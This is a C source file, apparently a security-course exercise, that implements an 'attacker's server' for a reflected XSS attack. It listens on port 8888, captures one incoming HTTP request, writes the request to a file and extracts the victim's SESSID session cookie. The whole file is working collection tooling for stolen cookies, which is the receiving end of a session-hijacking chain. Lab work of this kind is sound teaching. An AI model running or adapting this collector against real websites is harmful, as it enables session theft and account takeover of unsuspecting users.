/*
 * ex3_reflected.c
 * 
 * XSS Attack Demonstration - Attacker's Server
 * 
 * This program implements a simple HTTP server that listens on port 8888
 * and captures one HTTP GET request. It logs the entire request to
 * spoofed-reflected.txt for analysis, particularly to extract session cookies
 * stolen via reflected XSS attacks.
 * 
 * Compilation: gcc -Wall -Wextra -Werror -Wconversion ex3_reflected.c -o ex3_reflected
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 8888
#define BUFFER_SIZE 8192
#define OUTPUT_FILE "spoofed-reflected.txt"

/*
 * extract_sessid - Extracts only the SESSID value from HTTP request
 * @request: The raw HTTP request string
 * @sessid_out: Output buffer to store the extracted SESSID
 * @out_size: Size of the output buffer
 * 
 * Searches for SESSID in the Cookie header or URL parameters and
 * extracts only its value without any prefix.
 * 
 * Returns: 1 on success, 0 if SESSID not found or error
 */
static int extract_sessid(const char *request, char *sessid_out, size_t out_size) {
    const char *sessid_start = NULL;
    
    sessid_start = strstr(request, "SESSID=");
    
    if (sessid_start == NULL) {
        const char *cookie_line = strstr(request, "Cookie:");
        if (cookie_line == NULL) {
            cookie_line = strstr(request, "cookie:");
        }
        
        if (cookie_line != NULL) {
            sessid_start = strstr(cookie_line, "SESSID=");
        }
    }
    
    if (sessid_start != NULL) {
        sessid_start += 7;
        
        const char *sessid_end = sessid_start;
        while (*sessid_end != '\0' && 
               *sessid_end != ';' && 
               *sessid_end != ' ' && 
               *sessid_end != '\r' && 
               *sessid_end != '\n') {
            sessid_end++;
        }
        
        size_t sessid_len = (size_t)(sessid_end - sessid_start);
        if (sessid_len > 0 && sessid_len < out_size) {
            memcpy(sessid_out, sessid_start, sessid_len);
            sessid_out[sessid_len] = '\0';
            return 1;
        }
    }
    return 0;
}

/*
 * extract_cookie - Extracts and prints cookie information from HTTP request
 * @request: The raw HTTP request string
 * 
 * Searches for the "Cookie:" header in the HTTP request and extracts
 * session information if present.
 */
static void extract_cookie(const char *request) {
    const char *cookie_line = strstr(request, "Cookie:");
    if (cookie_line == NULL) {
        cookie_line = strstr(request, "cookie:");
    }
    
    if (cookie_line != NULL) {
        const char *line_end = strstr(cookie_line, "\r\n");
        if (line_end == NULL) {
            line_end = strstr(cookie_line, "\n");
        }
        
        if (line_end != NULL) {
            size_t cookie_len = (size_t)(line_end - cookie_line);
            char *cookie = malloc(cookie_len + 1);
            if (cookie != NULL) {
                memcpy(cookie, cookie_line, cookie_len);
                cookie[cookie_len] = '\0';
                printf("Extracted: %s\n", cookie);
                free(cookie);
            }
        }
    }
}

/*
 * send_http_response - Sends a minimal HTTP 200 OK response
 * @client_fd: File descriptor of the connected client socket
 */
static void send_http_response(int client_fd) {
    const char *response = 
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: 27\r\n"
        "Connection: close\r\n"
        "\r\n"
        "<html>Request logged</html>";
    
    ssize_t sent = write(client_fd, response, strlen(response));
    (void)sent;
}

int main(void) {
    int server_fd;
    int client_fd;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len;
    char buffer[BUFFER_SIZE];
    char sessid[256];
    ssize_t bytes_read;
    FILE *output_file;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("Setsockopt failed");
        close(server_fd);
        return 1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_fd);
        return 1;
    }

    if (listen(server_fd, 1) < 0) {
        perror("Listen failed");
        close(server_fd);
        return 1;
    }

    printf("Attacker's server listening on port %d...\n", PORT);

    client_addr_len = sizeof(client_addr);
    client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_addr_len);
    if (client_fd < 0) {
        perror("Accept failed");
        close(server_fd);
        return 1;
    }

    printf("Connection received from %s:%d\n", 
           inet_ntoa(client_addr.sin_addr), 
           ntohs(client_addr.sin_port));

    memset(buffer, 0, BUFFER_SIZE);
    bytes_read = read(client_fd, buffer, BUFFER_SIZE - 1);
    if (bytes_read < 0) {
        perror("Read failed");
        close(client_fd);
        close(server_fd);
        return 1;
    }

    buffer[bytes_read] = '\0';

    printf("Request captured (%zd bytes)\n", bytes_read);

    output_file = fopen(OUTPUT_FILE, "w");
    if (output_file == NULL) {
        perror("Failed to open output file");
        close(client_fd);
        close(server_fd);
        return 1;
    }

    if (fprintf(output_file, "%s", buffer) < 0) {
        perror("Failed to write to output file");
        fclose(output_file);
        close(client_fd);
        close(server_fd);
        return 1;
    }

    fclose(output_file);
    printf("Request written to %s\n", OUTPUT_FILE);

    extract_cookie(buffer);
    
    memset(sessid, 0, sizeof(sessid));
    if (extract_sessid(buffer, sessid, sizeof(sessid))) {
        printf("SESSID stored: %s\n", sessid);
    } else {
        printf("SESSID not found in request\n");
    }

    send_http_response(client_fd);

    close(client_fd);
    close(server_fd);

    printf("Server shutting down gracefully.\n");

    return 0;
}
